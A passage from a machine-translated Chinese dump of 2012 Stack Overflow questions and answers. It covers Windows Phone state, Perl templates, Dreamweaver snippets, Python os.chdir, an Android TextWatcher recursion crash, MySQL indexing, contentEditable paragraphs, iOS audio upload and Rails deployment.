您可以使用 OnNavigateTo 方法来加载它，并使用 OnNavigatedFrom 方法来保存它。

如果你需要持久化一个更大或更复杂的对象，那么你可以使用 JSON 或 XML 来序列化/反序列化对象——你可以考虑使用更通用的存储技术——例如，IsolatedStorage 中的文件或 SQLCE、SQLite 等数据库解决方案或英镑

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T15:02:13.467

我认为实例成员不会在导航期间被破坏，除非页面从后台堆栈中删除或应用程序被墓碑化。您不必编写额外的代码行来使实例成员保持活动状态。所以你不必将它存储在PhoneApplicationService 的State 中。

# ios - 在 Facebook 上分享图片时添加默认句子

> ID：10862317
> 
> 赞同：1
> 
> 时间：2012-06-02T12:26:17.663
> 
> 标签：ios, facebook, sharekit

有谁知道当用户在他的墙上分享东西时如何设置默认句子？我没有询问用户的文字。我在问如何显示标语“......与......合影”。

![和 instagram 拍了一张照片](../Images/f07383ea35600e30d8db295cce13ec03.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:13:14.503

参考[这个](http://www.getsharekit.com/docs/#image)链接。

```
UIImage *image = [UIImage imageNamed:@"Image.jpg"]; // You Image that u want to share
SHKItem *item = [SHKItem image:image title:@"XXX : took a photo with Instagram"];
[SHKFacebook shareItem:item]; 
```

希望它对你有用。

# html - 我可以在我的 perl 脚本中使用 HTML::Template 吗？

> ID：10862327
> 
> 赞同：1
> 
> 时间：2012-06-02T12:28:11.630
> 
> 标签：html, perl, templates

我正在使用 godaddy.com 进行网站托管

我可以在我的 perl 脚本中使用 HTML::Template 吗？我想将 perl 脚本输出发送到模板文件，该文件在内部生成网页并显示在浏览器上。但是当我在我的 perl 脚本中使用 HTML::Template 时，我得到了错误。

谢谢，德维什

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:49:23.920

首先，您需要`HTML::Template`通过运行此支持文章中的命令来检查是否已安装在 godaddy 服务器上：

[http://support.godaddy.com/help/article/1488/can-i-add-perl-modules-to-my-hosting-account](http://support.godaddy.com/help/article/1488/can-i-add-perl-modules-to-my-hosting-account)

如果`perl -MFile::Find=find ...`调用在列表中返回 HTML::Template，您可能会错误地使用它。

如果该命令未返回列表中的模块，您可以尝试创建模块的本地安装（例如，在`lib`您的 Web 根目录中的目录中）并包含本地目录中的 HTML::Template。就像是：

```
BEGIN { push(@INC, '/path/to/the/lib/directory/') };
use strict;
use warnings;
use HTML::Template; 
```

# dreamweaver - 自定义预定义代码模板

> ID：10862334
> 
> 赞同：1
> 
> 时间：2012-06-02T12:28:42.947
> 
> 标签：dreamweaver

我一直在到处寻找，但我要么失明，要么真的不存在。

我正在寻找一些选项来向 Dreamweaver (CS5.5) 添加某种代码模板，我可以通过代码提示菜单使用一些短代码访问它。在 Zend (PHP IDE) 中，您可以定义这样的代码块，例如

```
$query = "";
$sql = mysql_query($query);
$result = mysql_fetch_assoc($sql); 
```

并让 Zend 在输入“qry”并按 Enter 时将它们放入您的代码中。

Adobe Dreamweaver CS5.5 中有这样的选项吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-05T11:17:59.967

我一直在寻找相同的方法并找到了解决方案。尝试将您的 Dreamweaver 安装路径“\Adobe Dreamweaver CS5\configuration\CodeHints\php_codehints.xml”添加到该部分

```
<menugroup MMString:name="php/CORE" id="PHP_CORE"></menugroup> 
```

以下代码：

```
<menu pattern="$query" doctypes="PHP_MySQL" displayrestriction="PHP_Script" 
caseSensitive="true"  icon="shared/mm/images/hintKeyword.png"  
MMString:source="php/CORE" >
   <menuitem label="mssql fetch //complete" value="=&quot;
SELECT * FROM 
WHERE  
&quot;;
$Qresult = mssql_query($query);
while ($Qdata = mssql_fetch_assoc($Qresult)) {
    echo $Qdata[''];
};
" icon="shared/mm/images/hintMisc.gif"/>
</menu> 
```

现在，当您在 PHP 站点中的代码中键入**$query**时，dreamweaver 将为您提供“ **mssql fetch //complete** ”

类似地其他代码块。例如以下：

```
<menu pattern="for" doctypes="PHP_MySQL" displayrestriction="PHP_Script" 
caseSensitive="true"  icon="shared/mm/images/hintKeyword.png" 
MMString:source="php/CORE" >
<menuitem label="foreach()//complete" value="each ($arr as $k => $v) {

}" icon="shared/mm/images/hintMisc.gif"/>
<menuitem label="for()//complete" value=" ($i=0; $i<=$ ; $i++) {

};" icon="shared/mm/images/hintMisc.gif"/>
</menu>

<menu pattern="if"  doctypes="PHP_MySQL" displayrestriction="PHP_Script" 
caseSensitive="true"  icon="shared/mm/images/hintKeyword.png"  
MMString:source="php/CORE" >
<menuitem label="if()//complete" value=" ( ) {

}" icon="shared/mm/images/hintMisc.gif"/>
<menuitem label="if else//complete" value=" ( ) {

}
else {

}" icon="shared/mm/images/hintMisc.gif"/>
</menu> 
```

我认为这个解决方案自 CS 版本以来适用于 Dreamweaver，也可能在 MX 中。

在另一个站点上，您可以简单地使用 SHIFT+F9 并定义您自己的代码块来粘贴。

# python - os.system 在 Python 中不起作用

> ID：10862340
> 
> 赞同：0
> 
> 时间：2012-06-02T12:29:54.777
> 
> 标签：python, command, system, dos

我正在使用 windows vista，但我正在从 DOS 命令运行 python。我有这个简单的 python 程序。（实际上是一个名为test.py的py文件）

```
import os
os.system('cd ..') 
```

当我从 Dos 命令执行“python test.py”时，它不起作用。例如，如果执行前的提示 Dos Command 是这样的：

```
C:\Directory> 
```

执行后，一定是这样的：

```
C:\> 
```

帮助请。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T12:34:46.353

首先，您通常不想使用`os.system`- 改为查看[subprocess 模块](http://docs.python.org/library/subprocess.html)。但是，这并不能解决您的直接问题（只是您可能遇到的一些问题） - 实际原因`cd`不起作用是因为它更改了*subprocess*的工作目录，并且不影响 Python 正在运行的进程- 为此，请使用[`os.chdir`](http://docs.python.org/library/subprocess.html).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T18:09:23.653

我真的不会使用 Windows，但你可以尝试`cmd /k yourcommandhere`. 这将执行命令，然后返回到 CMD 提示符。例如，也许你可以像这样做你想做的事：

```
subprocess.call(['cmd', '/k', 'cd .. &&  prompt changed']) 
```

正如我所说，我不熟悉 Windows，所以语法可能是错误的，但你应该明白。

如果您不知道，这是一个不同于您在启动 python 脚本之前使用的 CMD 实例。因此，当您退出时，您的 python 脚本应该继续执行，完成后，您将回到原来的 CMD。

# java - 从 textwatcher 访问 edittext

> ID：10862343
> 
> 赞同：-2
> 
> 时间：2012-06-02T12:30:19.140
> 
> 标签：java, android

我正在使用 textWatcher ：

```
final EditText et = (EditText) findViewById(R.id.editText1);
final TextView tv = (TextView) findViewById(R.id.textView2);

    et.addTextChangedListener(new TextWatcher()
    {
            public void afterTextChanged(Editable s){
                    if(s.length() > 0) {
                    tv.setText(s.toString().substring(s.length()-1));
                    et.setText("");
                }
            }
            public void beforeTextChanged(CharSequence s,int start,int count, int after){} 
            public void onTextChanged(CharSequence s, int start, int before, int count) {}
    }); 
```

这个返回错误，我无法访问et.setText，因为它可能是最终的或者因为它被键盘锁定了，知道吗？

日志猫：

```
06-02 13:35:25.139: D/AndroidRuntime(12532): Shutting down VM
06-02 13:35:25.139: W/dalvikvm(12532): threadid=1: thread exiting with uncaught exception (group=0x40018578)
06-02 13:35:25.219: E/AndroidRuntime(12532): FATAL EXCEPTION: main
06-02 13:35:25.219: E/AndroidRuntime(12532): java.lang.StackOverflowError
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView$InsertionPointCursorController.hide(TextView.java:8609)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.hideInsertionPointCursorController(TextView.java:9088)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.hideControllers(TextView.java:9105)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2677)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input$1.beforeTextChanged(Input.java:27)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.sendBeforeTextChanged(TextView.java:6554)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2702)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2662)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.EditText.setText(EditText.java:178)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at android.widget.TextView.setText(TextView.java:2637)
06-02 13:35:25.219: E/AndroidRuntime(12532):    at com.pack.witch.Input 
```

Ps：我需要更改用户键入的内容，例如，如果他键入“A”，我将显示“D”，这看起来就像他键入“D”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:37:51.617

这是堆栈溢出。文本正在改变，它调用文本观察器，它改变了调用你的文本观察器的文本，它改变了调用你的文本观察器的文本......

您应该在更改其中的文本之前删除您的文本观察器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-02T12:40:58.447

可能是[http://developer.android.com/reference/android/text/TextWatcher.html#afterTextChanged(android.text.Editable](http://developer.android.com/reference/android/text/TextWatcher.html#afterTextChanged%28android.text.Editable%29) )

调用此方法是为了通知您，在 s 中的某处，文本已更改。从此回调中对 s 进行进一步更改是合法的，但请注意不要让自己陷入无限循环，因为您所做的任何更改都会导致再次递归调用此方法。（您不会被告知更改发生的位置，因为其他 afterTextChanged() 方法可能已经进行了其他更改并使偏移量无效。但是如果您需要在这里知道，

不是最好的解决方案，但看看试试这个

[如何使用 TextWatcher 更新相同的 EditText？](https://stackoverflow.com/questions/9498155/android-java-update-same-edittext-in-textchanged-event)

或者

最后的 EditText et = (EditText) findViewById(R.id.editText1); final TextView tv = (TextView) findViewById(R.id.textView2); 布尔 isManulChange = false;

```
et.addTextChangedListener(new TextWatcher()
{
        public void afterTextChanged(Editable s){

                if(isManulChange ){
                     isManulChange   = false;
                     return;
                   }

                if(s.length() > 0) {
                tv.setText(s.toString().substring(s.length()-1));
                et.setText("");
                isManulChange   = true;//
            }
        }
        public void beforeTextChanged(CharSequence s,int start,int count, int after){} 
        public void onTextChanged(CharSequence s, int start, int before, int count) {}
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-02T13:00:31.283

试试这个方法

```
final EditText et = (EditText) findViewById(R.id.editText1);
final TextView tv = (TextView) findViewById(R.id.textView2);

et.addTextChangedListener(new TextWatcher()
{
        public void afterTextChanged(Editable s){

            }
        }
        public void beforeTextChanged(CharSequence s,int start,int count, int after){} 
        public void onTextChanged(CharSequence s, int start, int before, int count) {
                if(s.length() > 0) {
                tv.setText(s.toString().substring(s.length()-1));
                et.setText("");}
         }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-04-19T08:20:42.113

通过这个你可以防止无限循环

```
@Override
public void onTextChanged(CharSequence charSequence, int i, int i2, int i3) {
    if (textWatchEdited) {
        textWatchEdited = false;
        return;
    }
    String str = charSequence.toString();
    // do something
    textWatchEdited = true;
    view.setText(str);
} 
```

# php - php + mysql：在某个字段中查找包含字符串“ABC”的所有行

> ID：10862344
> 
> 赞同：1
> 
> 时间：2012-06-02T12:31:03.320
> 
> 标签：php, mysql, indexing

我对这些东西比较陌生，所以如果问题是转储，请原谅。假设一个包含字段的表：id、str_field。str_field 的值类似于“12:17:1246:90”。我想获取 str_field 包含的所有行，例如“17”。为此，我需要执行以下命令

```
SELECT id FROM `table_name` WHERE INSTR(str_field, '17')>0 
```

如果表中有大量行，则查询可能会很慢。这里的问题是：如果我要索引 str_field 会增加查询执行的速度吗？

先感谢您！

**附言**。换句话说，我在问：索引是否会增加查询的速度，例如

```
SELECT * FROM `table_name` WHERE str_field='value' 
```

?

**UPD** str_field 仅包含用冒号分隔的数字。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T12:45:42.997

> 如果表中有大量行，则查询可能会很慢。这里的问题是：如果我要索引 str_field 会增加查询执行的速度吗？

不多。如果您的表中有许多其他列，那么您可以在您使用的列上创建一个覆盖索引：`(id, str_field)`. 这会稍微快一些，因为索引会比原始表小，因此可以更快地读取。但是，它仍然需要对索引进行全面扫描（而不是对整个表进行全面扫描）。

但除此之外，您可以通过使用一个名为[denormalization](http://en.wikipedia.org/wiki/Denormalization)的方法，使用具有三列的单独表来存储单独的整数来提高查询速度。

```
parent   sortorder   value
1        1           12
1        2           17
1        3           1246
1        4           90 
```

像这样查询：

```
SELECT parent AS id
FROM table_values
WHERE `value` = 17 
```

然后，您可以为此表添加索引`(value, parent)`，这将加快查询速度。请注意，`sortorder`此查询不需要该列。如果您认为您永远不需要它，那么您不需要在表格中包含此列。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-02T12:35:56.317

您可以创建全文索引并使用特殊的 MATCH 功能：[http ://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html](http://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html)

尽管如此，搜索值而不是表达式要快得多......

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-02T12:47:00.757

索引可以提高性能，这是真的。

如果您有一个包含字符串数据的字段`12:17:1246:90`，您可以使用查询

```
SELECT id FROM `table_name` WHERE `str_field` LIKE '%17%'; 
```

`%`是一个小丑字符，表示*一个或多个字符*。

# newline - contentEditable area::force 段落换行 - 跨浏览器

> ID：10862345
> 
> 赞同：3
> 
> 时间：2012-06-02T12:31:16.710
> 
> 标签：newline, contenteditable, paragraph, execcommand

Firefox用 换行`<br>`，Chrome 和 Safari用 换行`<div>...</div>`，Internet Explorer 和 Opera 用段落`<p>...</p>`换行。

我正在寻找一种方法来强制每个浏览器在换行时只创建段落。

我知道[ckeditor](http://ckeditor.com/)支持这个功能，但我怎样才能在我的自定义编辑器中简单地实现它呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-08-11T12:47:22.753

对我来说是添加`document.execCommand('formatBlock', false, 'p');`到`keypress`contenteditable div 中的事件的解决方案。例如：

```
element.addEventListener('keypress', function(ev){
    if(ev.keyCode == '13')
        document.execCommand('formatBlock', false, 'p');
}, false); 
```

希望它会帮助某人。:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-01-27T21:03:46.123

如果您想在`<p>`换行后添加一个新行，但又想保持上一行的格式不变（即您从 a 换行`<h1>`），请结合@MorganTiley 和@PageOnline 的答案：

```
editor.addEventListener('keypress', function(e){
    if(e.keyCode == '13') {
      e.preventDefault();
      document.execCommand('insertParagraph', false);
      document.execCommand('formatBlock', false, 'p');
    }
  }, false); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-05T14:15:28.527

试试 execCommand "insertparagraph"，例如：

```
document.execCommand('insertParagraph',false,'id for new p') 
```

或者，您可以处理 keydown 事件，捕获 keycode 13（不带修饰符），然后做任何您喜欢的事情。

**已更正**

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2012-06-04T14:14:03.680

你没有具体说明你想要这个功能在哪个编辑器中，但你提到了 CKEditor 所以我假设你在问它。只需将其添加到您的 config.js 文件中：

```
config.enterMode = CKEDITOR.ENTER_P; 
```

# ios - iPhone：将音频 wav 字节数据上传到服务器时出错

> ID：10862354
> 
> 赞同：1
> 
> 时间：2012-06-02T12:33:00.560
> 
> 标签：ios, audio

我正在开发一个 iOS 应用程序。我必须以编程方式将音频文件发送到我们的服务器。我正在使用以下代码将示例 wav 音频文件发送到服务器。我们的服务器只接受有符号字节数组格式的音频文件进行接收。

```
NSURL *urlPath = [NSURL fileURLWithPath: [[NSBundle mainBundle] pathForResource:@"Crash" ofType:@"wav"]];
NSString *wavbundlepath = [urlPath absoluteString];
NSLog(@"wavbundlepath: %@",wavbundlepath);
NSData *bytes = [wavbundlepath dataUsingEncoding:NSUTF8StringEncoding];
NSLog(@"bytes: %@",bytes);

NSString *recordPostLength = [NSString stringWithFormat:@"%d", [bytes length]];

NSMutableString *urlstr = [NSMutableString stringWithFormat:@"%@", @"http://www.mywebserver/api/UploadFile?Name="];
[urlstr appendString:@"crash"];
[urlstr appendFormat:@"&MemberID=%d", 0];
[urlstr appendFormat:@"&Type=%@",@"Recording"];
[urlstr appendFormat:@"&client=%@",@"ios"];
NSLog(@"urlstr.......%@",urlstr);

NSMutableURLRequest *recordRequest = [[NSMutableURLRequest alloc] init] ;
[recordRequest setURL:[NSURL URLWithString:urlstr]];
[recordRequest setHTTPMethod:@"POST"];
[recordRequest setValue:recordPostLength forHTTPHeaderField:@"Content-Length"];
[recordRequest setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
[recordRequest setHTTPBody:bytes];

NSURLResponse *recordResponse;
NSError *recordError;
NSData *recordResponseData = [NSURLConnection sendSynchronousRequest:recordRequest returningResponse:&recordResponse error:&recordError];
NSString *recordResp = [[NSString alloc]initWithData:recordResponseData encoding:NSUTF8StringEncoding];

NSLog(@"recordResp:%@", recordResp); 
```

但问题是，总是收到“输入字符串不正确”。响应错误。

我不太了解将音频字节上传到服务器。有人可以检查此代码并告诉我这是用于将 wav 音频字节数组上传到服务器的有效代码吗？

谢谢你。

* * *

**更新代码**

我尝试了下面的代码，因为我的服务器端工程师说没有任何其他的东西发布正文，它工作正常并得到了积极的回应。但是，服务器无法使用我正在发送的格式 NSData 字节（32 位元素），因为服务器端实现了仅接收字节数组或仅接收有符号字节数据格式。

```
NSURL *urlPath = [NSURL fileURLWithPath: [[NSBundle mainBundle] pathForResource:@"Temp" ofType:@"wav"]];

NSString *wavbundlepath = [urlPath absoluteString];
NSLog(@"wavbundlepath: %@",wavbundlepath);

NSData *bytes=[NSData dataWithContentsOfURL:urlPath];
NSLog(@"bytes: %@",bytes);

NSString *recordPostLength = [NSString stringWithFormat:@"%d", [bytes length]];

NSMutableString *urlstr = [NSMutableString stringWithFormat:@"%@", @"http://www.myserver.com/api/UploadFile?Name="];
[urlstr appendString:@"Temp"];
[urlstr appendFormat:@"&MemberID=%d", 0];
[urlstr appendFormat:@"&Type=%@",@"Recording"];
[urlstr appendFormat:@"&client=%@",@"ios"];
NSLog(@"urlstr.......%@",urlstr);

NSMutableURLRequest *recordRequest = [[NSMutableURLRequest alloc] init] ;
[recordRequest setURL:[NSURL URLWithString:urlstr]];

NSInputStream *dataStream = [NSInputStream inputStreamWithData:bytes];
[recordRequest setHTTPBodyStream:dataStream];

[recordRequest setHTTPMethod:@"POST"];

NSURLResponse *recordResponse;
NSError *recordError;
NSData *recordResponseData = [NSURLConnection sendSynchronousRequest:recordRequest returningResponse:&recordResponse error:&recordError];

NSString *recordResp = [[NSString alloc]initWithData:recordResponseData encoding:NSUTF8StringEncoding];
NSLog(@"recordResp:%@", recordResp);
recordResponceJson = [recordResp JSONValue]; 
NSLog(@"recordResponceJson = %@",recordResponceJson);
recId = [recordResponceJson valueForKey:@"ID"];
NSLog(@"recId....%@", recId); 
```

有人可以指导我，我如何在这个 http 帖子中发送字节数组？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:04:37.087

有几个问题：首先，您读取文件的方式不会返回有效的 WAV 文件：

您应该使用 [NSData dataWithContentsOfURL:] 来读取字节。您阅读它们的方式将尝试将字节转换为字符。这将损坏您的 wav 文件。

其次，POST 正文的内容类型可能不正确。见行：

```
[recordRequest setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"]; 
```

音频字节不会以 x-www-form-urlencoded 格式编码。服务器更有可能接受音频/wav 或应用程序/八位字节流内容类型。请咨询您的服务器开发人员，以了解服务器的确切预期。

此外，您可能想查看名为 setHTTPBodyStream 的 NSMutableURLRequest 方法：它允许您发送文件而无需将整个内容加载到内存中。

# ruby-on-rails - 想离线开发 Rails 站点然后转移到服务器

> ID：10862356
> 
> 赞同：1
> 
> 时间：2012-06-02T12:33:01.107
> 
> 标签：ruby-on-rails

在我的 macbook 上开发我的网站，然后在完成后移动到服务器是否有问题？是否会有我需要提前计划的问题？可能与 DB 或 ruby​​ 相关？依赖关系或服务器可能与我的开发环境不同的东西可能会导致以后的噩梦？我宁愿离线开发它，因为它会更快并且不需要互联网连接，但过去我总是用实时站点完成所有事情，所以这将是第一次，而且我是 ruby​​ on rails 的新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T12:40:11.400

在本地开发，然后通过类似 capistrano 的方式部署到您的服务器是标准做法。

让您的开发环境尽可能接近生产环境（ruby 版本、数据库版本等）是一个好主意。Bundler 使您的 gem 保持同步变得容易

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:42:36.063

我在一些项目中使用了 Heroku。部署尽可能简单。我刚刚做了一个`git push`，它没有问题......我真的很喜欢捆绑器和耙子:-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:58:43.623

您的问题体现了在 Rails 中开发的方式。您的开发环境是您的生产站点的离线表示。

一个快速的工作流分析可能是：

`rails new ~/my_app -d postgresql; cd ~/my_app; rm public/index.html`

接下来，创建数据库：

`bundle exec rake db:create:all`

现在您将设置好数据库和应用程序，让我们设置您的主页：

`bundle exec rails generate controller Site index about_us contact_us`

现在你可以在网站上看到一些东西，所以运行：

`bundle exec rails server`

该服务器充当您的离线连接，并将处理您希望在 Rails 应用程序中提供的任何文本、图像、html 等的呈现。现在您可以加入 TDD、TATFT 或 JITT、rspec 与 test::unit 的辩论。欢迎。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-02T13:03:05.640

本地开发绝对是一条路。但是，我会考虑尽快将其投入生产并经常推动。通过这种方式，您可以在进行更改时看到更改发生，并了解任何可能的重大更改。

我经常使用heroku，当我开始一个新项目时，我几乎立即将它推送到heroku。在开发过程中，我可以简单地通过`git push heroku master`. 每个人都必须找到自己的工作流程，但这对我来说一直很有效。

如果您对 Heroku 感兴趣，这里有一个很好的链接可以帮助您入门：

[https://devcenter.heroku.com/articles/rails3](https://devcenter.heroku.com/articles/rails3)

# jquery - 电子邮件验证正则表达式 - 未知问题

> ID：10862357
> 
> 赞同：0
> 
> 时间：2012-06-02T12:33:04.050
> 
> 标签：jquery, validation

我在验证电子邮件地址时遇到问题。我正在使用来自[http://ask.altervista.org/demo/jquery-validate-e-mail-address-regex/](http://goo.gl/7TyCp)的 RegEx，所以我认为 RegEx 没有任何问题。

当我按下电子邮件的输入字段时，它会添加类错误，但不会验证电子邮件。我从链接中尝试了 blah@blah.museum。

我几乎有相同的方法来验证名称和消息它的工作原理。

```
email.blur(validateEmail);
email.keyup(validateEmail);

function validateEmail(){
